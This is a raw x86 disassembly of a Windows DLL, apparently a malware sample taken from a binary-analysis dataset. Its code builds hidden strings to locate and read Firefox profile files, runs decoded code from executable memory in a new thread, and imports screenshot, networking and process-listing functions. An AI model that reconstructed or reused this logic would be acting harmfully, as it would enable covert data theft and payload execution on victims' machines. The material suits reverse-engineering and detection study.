pop ecx
pop ecx
push [ ebp - 0x18 ]
mov edi eax
mov ecx ebx
push edi
call sub_10005880
mov esi eax
mov ecx ebx
push esi
call sub_10005bbe
push esi
call j_sub_10003f1b
push edi
call j_sub_10003f1b
push [ ebp - 0x18 ]
call j_sub_10003f1b
mov esi [ ebp - 0x4 ]
add esp 0xc
mov ecx esi
call sub_100061d3
mov edi eax
test edi edi
je r-xdata
mov ecx esi
call sub_1000671e
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
push 0x1
push r--data
call sub_100030d1
pop ecx
pop ecx
push edi
push eax
mov ecx ebx
mov [ ebp - 0x24 ] eax
call sub_10005880
and [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0xc ]
cmp [ ebx + 0x20 ] 0x0
push ecx
mov [ ebp - 0x20 ] eax
mov ecx ebx
push eax
je r-xdata
call sub_100050fd
call sub_100051c0
jmp r-xdata
push [ ebp - 0x20 ]
call j_sub_10003f1b
push [ ebp - 0x24 ]
call j_sub_10003f1b
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0xc ]
mov ecx esi
push eax
call sub_100064d9
push 0x1
push r--data
mov ebx eax
call sub_100030d1
pop ecx
pop ecx
mov ecx [ ebp - 0x10 ]
mov edi eax
push ebx
push edi
call sub_10005880
mov ecx [ ebp - 0x10 ]
mov esi eax
push esi
call sub_10005bbe
push esi
call j_sub_10003f1b
push edi
call j_sub_10003f1b
push ebx
call j_sub_10003f1b
push [ ebp - 0x18 ]
call j_sub_10003f1b
mov ebx [ ebp - 0x10 ]
add esp 0x10
mov esi [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
sub_10006131
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor ecx ecx
push eax
push edx
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] ecx
call sub_100061ad
pop ecx
pop ecx
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10006160
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov ecx edi
call sub_1000389d
push edi
call sub_10003f1b
pop ecx
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ecx edi
call sub_10006d6f
push edi
call sub_10003f1b
pop ecx
and [ esi + 0x14 ] 0x0
and [ esi + 0x10 ] 0x0
pop edi
pop esi
retn
mov ecx edi
call sub_10006d83
push edi
call sub_10003f1b
pop ecx
sub_100061ad
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] 0x0
cmp dl 0xa
jne r-xdata
mov dl [ eax + ecx ]
cmp dl 0xd
je r-xdata
inc eax
cmp eax [ ebp + 0xc ]
jb r-xdata
sub_100061e0
push ebx
push edi
mov edi ecx
xor ebx ebx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
pop edi
mov eax ebx
pop ebx
retn
push esi
call sub_10003b7f
mov esi eax
test esi esi
je r-xdata
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
push esi
call [ lstrlenA@IAT ]
inc eax
push eax
call sub_10003f3c
push esi
mov ebx eax
push r--data
push ebx
call [ wsprintfA@IAT ]
add esp 0x10
and [ edi + 0x4 ] 0x0
pop esi
mov ecx esi
call sub_10006d6f
push esi
call sub_10003f1b
pop ecx
sub_10006238
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x6
push r--data
mov esi ecx
mov [ ebp - 0x1 ] 0x0
call sub_100030d1
push 0x7
pop edi
push edi
push r--data
mov [ ebp - 0x2c ] eax
call sub_100030d1
mov ebx eax
push 0x6
push r--data
mov [ ebp - 0x8 ] ebx
call sub_100030d1
push edi
push r--data
mov [ ebp - 0x28 ] eax
call sub_100030d1
push 0x8
push r--data
mov [ ebp - 0x24 ] eax
call sub_100030d1
push edi
push r--data
mov [ ebp - 0x20 ] eax
call sub_100030d1
push 0xa
push r--data
mov [ ebp - 0x1c ] eax
call sub_100030d1
push 0xb
push r--data
mov [ ebp - 0x18 ] eax
call sub_100030d1
add esp 0x40
mov [ ebp - 0x14 ] eax
push edi
push r--data
call sub_100030d1
push 0x8
push r--data
mov [ ebp - 0x10 ] eax
call sub_100030d1
mov ecx [ esi + 0x14 ]
add esp 0x10
mov [ ebp - 0xc ] eax
cmp ecx [ esi + 0x10 ]
jae r-xdata
push eax
call j_sub_10003f1b
push [ ebp - 0x10 ]
call j_sub_10003f1b
push [ ebp - 0x14 ]
call j_sub_10003f1b
push [ ebp - 0x18 ]
call j_sub_10003f1b
push [ ebp - 0x1c ]
call j_sub_10003f1b
push [ ebp - 0x20 ]
call j_sub_10003f1b
push [ ebp - 0x24 ]
call j_sub_10003f1b
push [ ebp - 0x28 ]
call j_sub_10003f1b
push ebx
call j_sub_10003f1b
push [ ebp - 0x2c ]
call j_sub_10003f1b
mov al [ ebp - 0x1 ]
add esp 0x28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ lstrcmpiA@IAT ]
push [ ebp - 0x2c ]
push eax
call edi
test eax eax
jne r-xdata
inc eax
mov [ esi + 0xc ] eax
lea eax [ ecx + 0x1 ]
mov [ esi + 0x14 ] eax
jmp r-xdata
push ebx
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx [ esi + 0x10 ]
jb r-xdata
push [ ebp - 0x28 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi ]
call sub_10003cdf
jmp r-xdata
push 0x14
call sub_10003f04
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_1000389d
push ebx
call sub_10003f1b
pop ecx
mov eax [ esi + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp - 0x24 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi ]
call sub_10003d7b
jmp r-xdata
push [ esi + 0xc ]
call sub_10002d28
add [ esi + 0x14 ] eax
add [ esi + 0xc ] eax
cmp [ ebp - 0x1 ] 0x0
pop ecx
jne r-xdata
xor eax eax
mov ecx eax
call sub_1000388a
jmp r-xdata
push [ ebp - 0x20 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi ]
call sub_10003d02
jmp r-xdata
mov ebx [ ebp - 0x8 ]
jmp r-xdata
mov [ esi ] eax
jmp r-xdata
push [ ebp - 0x1c ]
push [ esi + 0xc ]
call edi
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_10003d76
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
push [ ebp - 0x18 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
push [ esi + 0xc ]
call edi
test eax eax
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
push [ ebp - 0x10 ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
push 0x4
call sub_10003f04
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_10006d6f
push ebx
call sub_10003f1b
pop ecx
push [ ebp - 0xc ]
push [ esi + 0xc ]
call edi
test eax eax
jne r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_10006d69
jmp r-xdata
push [ esi + 0xc ]
mov ecx esi
call sub_1000653b
push 0x4
call sub_10003f04
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_10006d83
push ebx
call sub_10003f1b
pop ecx
mov [ esi + 0x4 ] eax
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10006d69
jmp r-xdata
mov [ esi + 0x8 ] eax
sub_100064d9
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
xor ebx ebx
mov ecx [ edi ]
test ecx ecx
je r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x8
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000390e
push 0x401
mov esi eax
call sub_10003f3c
pop ecx
mov ecx [ edi ]
mov ebx eax
push esi
call sub_10003b7f
push eax
push r--data
push ebx
call [ wsprintfA@IAT ]
mov esi [ edi ]
add esp 0x10
test esi esi
je r-xdata
and [ edi ] 0x0
pop esi
mov ecx esi
call sub_1000389d
push esi
call sub_10003f1b
pop ecx
sub_1000653b
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
push 0x3d
push edi
call sub_100032c4
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x8
mov [ esi ] 0x0
inc esi
push r--data
call sub_100030d1
push 0xa
push r--data
mov [ ebp - 0x10 ] eax
call sub_100030d1
push 0x6
push r--data
mov [ ebp - 0xc ] eax
call sub_100030d1
push 0x2
push r--data
mov [ ebp - 0x8 ] eax
call sub_100030d1
push 0x5
push r--data
mov [ ebp - 0x4 ] eax
call sub_100030d1
add esp 0x28
mov [ ebp + 0x8 ] eax
push [ ebp - 0x10 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
push esi
call sub_10003ce4
jmp r-xdata
push [ ebp - 0x8 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
push esi
call sub_10003d1e
jmp r-xdata
push [ ebp + 0x8 ]
call j_sub_10003f1b
push [ ebp - 0x4 ]
call j_sub_10003f1b
push [ ebp - 0x8 ]
call j_sub_10003f1b
push [ ebp - 0xc ]
call j_sub_10003f1b
push [ ebp - 0x10 ]
call j_sub_10003f1b
add esp 0x14
push [ ebp - 0x4 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx ]
push esi
call sub_10003d07
jmp r-xdata
push [ ebp + 0x8 ]
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x4 ]
push esi
call sub_10006d73
jmp r-xdata
push esi
call [ lstrlenA@IAT ]
mov ecx [ ebx + 0x8 ]
push eax
push esi
call sub_10006d98
sub_10006663
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx ecx
push esi
xor esi esi
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x4 ] esi
lea eax [ ebp - 0x4 ]
push edi
push eax
call sub_10003b82
mov edi eax
test edi edi
jne r-xdata
mov ecx [ ebx ]
call sub_10003b7f
push eax
call [ lstrlenA@IAT ]
push edi
mov esi eax
call [ lstrlenA@IAT ]
push r--data
add esi eax
call [ lstrlenA@IAT ]
add esi 0xb
add eax esi
push eax
call sub_10003f3c
pop ecx
push [ ebp - 0x4 ]
mov ecx [ ebx ]
mov esi eax
mov [ ebp - 0x10 ] 0x2d207325
mov [ ebp - 0xc ] 0x756c2520
mov [ ebp - 0x8 ] 0x9
call sub_10003b7f
push eax
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ wsprintfA@IAT ]
add esp 0x10
mov ebx eax
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
pop edi
push edi
call [ lstrlenA@IAT ]
push eax
lea eax [ ebx + esi ]
push edi
push eax
call sub_10003271
push edi
call j_sub_10003f1b
add esp 0x10
sub_1000671e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi ecx
xor ebx ebx
mov ecx [ edi + 0x8 ]
test ecx ecx
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_10006dfb
push 0x401
mov bl al
call sub_10003f3c
push 0x8
push r--data
mov [ ebp - 0x8 ] eax
call sub_100030d1
push [ ebp - 0x4 ]
movzx ecx bl
mov esi eax
mov ebx [ ebp - 0x8 ]
push ecx
push esi
push ebx
call [ wsprintfA@IAT ]
push esi
call j_sub_10003f1b
mov esi [ edi + 0x8 ]
add esp 0x20
test esi esi
je r-xdata
and [ edi + 0x8 ] 0x0
pop esi
mov ecx esi
call sub_10006d83
push esi
call sub_10003f1b
pop ecx
sub_100067b6
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100067ec
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test [ ebp + 0x8 ] 0x4
jne r-xdata
push 0x10
push esi
call sub_100022e6
pop ecx
push esi
call sub_10003f1b
jmp r-xdata
pop ecx
sub_10006819
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebp
retn 0x4
push [ esi + 0x4 ]
call j_sub_10003f1b
pop ecx
sub_10006839
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
pop esi
pop ebp
retn 0x4
push [ esi + 0xc ]
call j_sub_10003f1b
pop ecx
sub_10006859
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
push [ esi + 0x8 ]
call j_sub_10003f1b
pop ecx
sub_1000688b
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100067ab
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test [ ebp + 0x8 ] 0x4
jne r-xdata
push 0x10
push esi
call sub_100022e6
pop ecx
push esi
call sub_10003f1b
jmp r-xdata
pop ecx
sub_100068c1
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi ecx
xor bl bl
call sub_10006907
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
push esi
push eax
mov ecx edi
call sub_10006c2f
push [ ebp - 0x4 ]
mov esi eax
call j_sub_10003f1b
xor eax eax
movzx ebx bl
inc eax
test esi esi
pop ecx
push esi
mov ecx edi
cmovne ebx eax
call sub_10006819
pop esi
sub_10006907
push ebp
mov ebp esp
sub esp 0xb0
push ebx
push esi
push edi
mov esi 0x208
push esi
call sub_10003f3c
pop ecx
push 0x0
mov ebx eax
push 0x1a
push ebx
push 0x0
mov [ ebp - 0xb0 ] ebx
call [ SHGetSpecialFolderPathW@IAT ]
push esi
call sub_10003f3c
push 0x4d
mov esi eax
pop eax
push 0x6f
pop edx
push 0x7a
mov [ ebp - 0x20 ] ax
pop eax
push 0x69
pop ecx
push 0x6c
pop edi
push 0x61
mov [ ebp - 0x1c ] ax
pop eax
push 0x46
mov [ ebp - 0x14 ] ax
xor eax eax
mov [ ebp - 0x12 ] ax
pop eax
push 0x72
mov [ ebp - 0x10 ] ax
pop eax
push 0x65
mov [ ebp - 0xc ] ax
pop eax
push 0x66
mov [ ebp - 0xa ] ax
pop eax
push 0x78
mov [ ebp - 0x8 ] ax
pop eax
push 0x70
mov [ ebp - 0x4 ] ax
xor eax eax
mov [ ebp - 0x2 ] ax
pop eax
push 0x72
mov [ ebp - 0x88 ] ax
pop eax
push 0x66
mov [ ebp - 0x86 ] ax
pop eax
push 0x65
mov [ ebp - 0x82 ] ax
pop eax
push 0x73
mov [ ebp - 0x1e ] dx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x84 ] dx
pop edx
push 0x2e
mov [ ebp - 0x7c ] ax
pop eax
push 0x6e
mov [ ebp - 0x78 ] ax
mov [ ebp - 0x1a ] cx
mov [ ebp - 0x18 ] di
mov [ ebp - 0x16 ] di
mov [ ebp - 0xe ] cx
mov [ ebp - 0x80 ] cx
mov [ ebp - 0x7e ] di
mov [ ebp - 0x7a ] dx
mov [ ebp - 0x76 ] cx
pop eax
push 0x25
mov [ ebp - 0x74 ] ax
xor eax eax
mov [ ebp - 0x70 ] ax
mov [ ebp - 0x72 ] cx
pop ecx
push 0x5c
pop eax
mov [ ebp - 0x68 ] ax
mov [ ebp - 0x62 ] ax
mov [ ebp - 0x5c ] ax
xor eax eax
mov [ ebp - 0x56 ] ax
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x6c ] cx
push eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x6a ] dx
push eax
push ebx
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x66 ] cx
push eax
push esi
mov [ ebp - 0x64 ] dx
mov [ ebp - 0x60 ] cx
mov [ ebp - 0x5e ] dx
mov [ ebp - 0x5a ] cx
mov [ ebp - 0x58 ] dx
call [ wsprintfW@IAT ]
push 0x50
pop ecx
push 0x72
pop eax
push 0x6f
mov [ ebp - 0x3e ] ax
pop eax
push 0x66
mov [ ebp - 0x3c ] ax
pop eax
push 0x69
mov [ ebp - 0x3a ] ax
pop eax
push 0x65
mov [ ebp - 0x38 ] ax
pop eax
push 0x30
mov [ ebp - 0x34 ] ax
pop eax
mov [ ebp - 0x32 ] ax
xor eax eax
push 0x61
mov [ ebp - 0x30 ] ax
pop eax
push 0x74
mov [ ebp - 0x2a ] ax
pop eax
mov [ ebp - 0x28 ] ax
push 0x68
pop eax
mov [ ebp - 0x26 ] ax
xor eax eax
push 0x208
mov [ ebp - 0x40 ] cx
mov [ ebp - 0x36 ] di
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x24 ] ax
call sub_10003f3c
add esp 0x20
mov edi eax
lea eax [ ebp - 0x2c ]
push esi
push 0x104
push edi
push r--data
push eax
lea eax [ ebp - 0x40 ]
push eax
call [ GetPrivateProfileStringW@IAT ]
push esi
call j_sub_10003f1b
push 0x2f
push edi
call sub_10003336
add esp 0xc
push 0x5c
pop edx
test eax eax
je r-xdata
push 0x70
pop eax
push 0x72
mov [ ebp - 0x54 ] ax
pop eax
push 0x65
mov [ ebp - 0x52 ] ax
pop eax
push 0x66
mov [ ebp - 0x50 ] ax
pop eax
push 0x73
pop ecx
push 0x2e
mov [ ebp - 0x4e ] ax
pop eax
push 0x6a
mov [ ebp - 0x4a ] ax
pop eax
mov [ ebp - 0x48 ] ax
xor eax eax
push 0x25
mov [ ebp - 0x44 ] ax
pop eax
mov [ ebp - 0xa8 ] ax
mov [ ebp - 0xa2 ] ax
mov [ ebp - 0x9c ] ax
mov [ ebp - 0x96 ] ax
mov [ ebp - 0x90 ] ax
xor eax eax
mov [ ebp - 0x8c ] ax
lea eax [ ebp - 0x54 ]
push eax
push edi
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] cx
push eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x46 ] cx
push eax
push ebx
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0xa6 ] cx
push eax
push ebx
mov [ ebp - 0xa4 ] dx
mov [ ebp - 0xa0 ] cx
mov [ ebp - 0x9e ] dx
mov [ ebp - 0x9a ] cx
mov [ ebp - 0x98 ] dx
mov [ ebp - 0x94 ] cx
mov [ ebp - 0x92 ] dx
mov [ ebp - 0x8e ] cx
call [ wsprintfW@IAT ]
push edi
call j_sub_10003f1b
add esp 0x20
xor esi esi
mov edi esi
push esi
push esi
push 0x3
push esi
push 0x1
push 0x80000000
push ebx
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub eax edi
sar eax 0x1
mov [ edi + eax * 2 ] dx
push [ ebp - 0xb0 ]
call j_sub_10003f1b
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push ebx
call [ GetFileSize@IAT ]
mov esi eax
push esi
call sub_10003f3c
and [ ebp - 0xac ] 0x0
mov edi eax
pop ecx
push 0x0
lea eax [ ebp - 0xac ]
push eax
push esi
push edi
push ebx
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
push edi
call j_sub_10003f1b
pop ecx
xor edi edi
sub_10006c2f
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0xc ] 0x0
push ebx
push 0x12
push r--data
call sub_100030d1
mov ebx eax
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
call sub_100032e2
add esp 0x10
test eax eax
je r-xdata
push ebx
call j_sub_10003f1b
mov eax [ ebp - 0xc ]
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push r--data
push eax
call sub_100032e2
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
push edi
add esi 0x3
push 0x22
push esi
call sub_100032c4
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
pop edi
cmp edi esi
jbe r-xdata
sub edi esi
lea eax [ edi + 0x1 ]
push eax
call sub_10003f3c
push edi
push esi
push eax
mov [ ebp - 0x8 ] eax
call sub_10003271
push 0x17
push r--data
call sub_100030d1
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_100032e2
add esp 0x20
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call j_sub_10003f1b
push [ ebp - 0x8 ]
call j_sub_10003f1b
pop ecx
pop ecx
push r--data
push eax
call sub_100032e2
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
add esi 0x2
push 0x29
push esi
call sub_100032c4
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x4 ]
cmp ebx esi
jbe r-xdata
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10003f3c
push ebx
mov edi eax
push esi
push edi
call sub_10003271
push 0x13
push r--data
call sub_100030d1
push 0x104
mov esi eax
call sub_10003f3c
push edi
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
push esi
push eax
call [ wsprintfA@IAT ]
push esi
call j_sub_10003f1b
push edi
call j_sub_10003f1b
add esp 0x34
sub_10006d98
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002ede
mov esi eax
add esp 0xc
test esi esi
je r-xdata
pop esi
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x40
push 0x3000
push [ ebp - 0x4 ]
push 0x0
call [ VirtualAlloc@IAT ]
mov [ edi ] eax
test eax eax
je r-xdata
push [ ebp - 0x4 ]
push esi
push eax
call sub_10003271
add esp 0xc
sub_10006dfb
push ebp
mov ebp esp
xor eax eax
push ebx
mov bl al
cmp [ ecx ] eax
je r-xdata
mov al bl
pop ebx
pop ebp
retn 0x4
push esi
push eax
push eax
push eax
push [ ecx ]
mov bl 0x1
push eax
push eax
call [ CreateThread@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
pop esi
ordinal_1
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push edi
xor ebx ebx
push ebx
push ebx
push ebx
push sub_10002e33
push ebx
push ebx
call [ CreateThread@IAT ]
mov edi eax
jmp r-xdata
push ebx
push ebx
push ebx
lea eax [ ebp - 0x1c ]
push eax
call [ GetMessageA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push edi
call [ CloseHandle@IAT ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn
sub_10001000
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
pop ebp
retn
sub_10001545
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10002b15
pop ecx
pop ebp
retn 0x4
sub_100022e6
retn
sub_10002393
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
cmp cl 0x41
jl r-xdata
pop ebp
retn
cmp cl 0x5a
jg r-xdata
add cl 0x20
mov [ eax ] cl
sub_100023ac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
cmp ecx 0x41
jb r-xdata
pop ebp
retn
cmp ecx 0x5a
ja r-xdata
add ecx 0x20
mov [ eax ] cx
sub_1000295a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
pop ebp
retn
sub_100031fe
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10003217
cmp [ ebp + 0x8 ] ax
pop ecx
pop ecx
sete al
pop ebp
retn
sub_1000388a
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov eax ecx
retn
sub_10003cdf
mov [ ecx + 0x10 ] 0x1
retn
sub_10003d02
mov [ ecx + 0x12 ] 0x1
retn
sub_10003d07
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10002f69
pop ecx
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
sub_10003d76
mov [ ecx + 0x13 ] 0x1
retn
sub_10003d7b
mov [ ecx + 0x11 ] 0x1
retn
sub_10003d80
push esi
mov esi ecx
call sub_10003d95
mov eax esi
pop esi
retn
sub_10003d8c
push [ ecx ]
call j_sub_10003f1b
pop ecx
retn
sub_100053c4
mov ecx [ ecx + 0x1c ]
xor eax eax
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
retn
retn
sub_10005414
mov ecx [ ecx + 0x1c ]
xor eax eax
test ecx ecx
jne r-xdata
mov eax [ ecx + 0xc ]
retn
retn
sub_10005422
mov ecx [ ecx + 0x1c ]
xor eax eax
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x8 ]
retn
retn
sub_100061d3
mov ecx [ ecx ]
xor eax eax
test ecx ecx
jne sub_10003b7f
retn
sub_10006797
xor eax eax
mov [ ecx ] r--data
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov eax ecx
retn
sub_100067ab
mov [ ecx ] r--data
jmp sub_100067ec
sub_100067ec
push esi
push 0x0
mov esi ecx
call sub_10006819
push 0x0
mov ecx esi
call sub_10006839
push 0x0
mov ecx esi
call sub_10006859
pop esi
retn
sub_1000680e
xor al al
retn
sub_10006879
push esi
mov esi ecx
call sub_10006797
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10006d69
and [ ecx ] 0x0
mov eax ecx
retn
sub_10006d6f
and [ ecx ] 0x0
retn
sub_10006d73
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
mov [ ecx ] eax
sub_10006d83
cmp [ ecx ] 0x0
je r-xdata
retn
push 0x8000
push 0x0
push [ ecx ]
call [ VirtualFree@IAT ]
_start
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
xor eax eax
inc eax
pop ebp
retn 0xc
push [ ebp + 0x8 ]
call [ DisableThreadLibraryCalls@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GdiplusShutdown
jmp [ GdiplusShutdown@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipCreateBitmapFromHBITMAP
jmp [ GdipCreateBitmapFromHBITMAP@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
GetAdaptersAddresses
jmp [ GetAdaptersAddresses@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32First
jmp [ Process32First@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
